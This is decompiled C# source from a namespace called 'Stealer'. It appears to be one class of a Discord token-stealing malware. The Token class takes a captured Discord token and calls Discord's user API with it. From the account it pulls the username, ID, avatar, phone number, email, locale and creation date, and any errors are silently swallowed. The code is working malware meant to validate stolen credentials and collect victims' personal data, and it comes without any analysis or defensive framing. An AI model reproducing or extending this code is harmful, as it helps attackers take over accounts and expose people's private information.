using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace Stealer
{
	// Token: 0x0200000D RID: 13
	internal class Token
	{
		// Token: 0x06000039 RID: 57 RVA: 0x00003A97 File Offset: 0x00001C97
		public Token(string inToken)
		{
			this.token = inToken;
			this.PostToken();
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003AB8 File Offset: 0x00001CB8
		private void PostToken()
		{
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					httpClient.DefaultRequestHeaders.Add("Authorization", this.token);
					Task<HttpResponseMessage> async = httpClient.GetAsync("https://discordapp.com/api/v8/users/@me");
					Task<string> task = async.Result.Content.ReadAsStringAsync();
					this.jsonResponse = task.Result;
				}
				this.GetData();
			}
			catch
			{
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003B40 File Offset: 0x00001D40
		private void GetData()
		{
			string str = Common.Extract("username", this.jsonResponse);
			this.userId = Common.Extract("id", this.jsonResponse);
			string str2 = Common.Extract("discriminator", this.jsonResponse);
			this.fullUsername = str + "#" + str2;
			string str3 = Common.Extract("avatar", this.jsonResponse);
			this.avatarUrl = "https://cdn.discordapp.com/avatars/" + this.userId + "/" + str3;
			this.phoneNumber = Common.Extract("phone", this.jsonResponse);
			this.email = Common.Extract("email", this.jsonResponse);
			this.locale = Common.Extract("locale", this.jsonResponse);
			long milliseconds = (Convert.ToInt64(this.userId) >> 22) + 1420070400000L;
			this.creationDate = DateTimeOffset.FromUnixTimeMilliseconds(milliseconds).DateTime.ToString();
		}

		// Token: 0x04000035 RID: 53
		private string token;

		// Token: 0x04000036 RID: 54
		private string jsonResponse = string.Empty;

		// Token: 0x04000037 RID: 55
		public string fullUsername;

		// Token: 0x04000038 RID: 56
		public string userId;

		// Token: 0x04000039 RID: 57
		public string avatarUrl;

		// Token: 0x0400003A RID: 58
		public string phoneNumber;

		// Token: 0x0400003B RID: 59
		public string email;

		// Token: 0x0400003C RID: 60
		public string locale;

		// Token: 0x0400003D RID: 61
		public string creationDate;
	}
}
